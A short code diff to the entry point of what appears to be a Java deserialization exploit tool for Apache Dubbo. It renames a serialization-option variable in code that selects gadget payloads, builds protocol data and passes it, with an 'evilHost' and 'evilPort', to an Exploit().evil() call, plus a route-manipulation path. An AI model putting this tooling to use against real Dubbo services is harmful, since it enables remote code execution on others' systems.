@@ -67,7 +67,7 @@ public class Main {
 
 
     String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
-    String s = cmd.getOptionValue("serialization");
+    String serializationOpt = cmd.getOptionValue("serialization");
 
     if (cmd.hasOption("help")) {
       HelpFormatter formatter = new HelpFormatter();
@@ -101,10 +101,10 @@ public class Main {
     List<Payloads> payloadsList = new ArrayList<>();
     if (cmd.hasOption("fastcheck")) {
       CheckDataCenter.initFastCheckData(cmd.getOptionValue("fastcheck"));
-      payloadsList = Payloads.getPayloads(s);
+      payloadsList = Payloads.getPayloads(serializationOpt);
     } else {
       if (payloadArgs != null && payloadArgs.length > 0) {
-        Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("gadget"), s);
+        Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("gadget"), serializationOpt);
         if (payloadEnum == null) {
           System.err.println("gadget[" + cmd.getOptionValue("gadget") + "]不存在");
           return;
@@ -136,7 +136,7 @@ public class Main {
         bytes = protocolImpl.makeData(bytes, serialization, extraData);
         payload[i] = bytes;
       }
-      new Exploit().evil(registryURL, scheme, username, password, evilHost, evilPort, registry != null && !registry.isEmpty(), payload, s, wait);
+      new Exploit().evil(registryURL, scheme, username, password, evilHost, evilPort, registry != null && !registry.isEmpty(), payload, serializationOpt, wait);
       System.exit(1);
     } else if (!route.isEmpty()) {
       new Exploit().route(registryURL, scheme, username, password, route, rule, routeDeleteTtl);
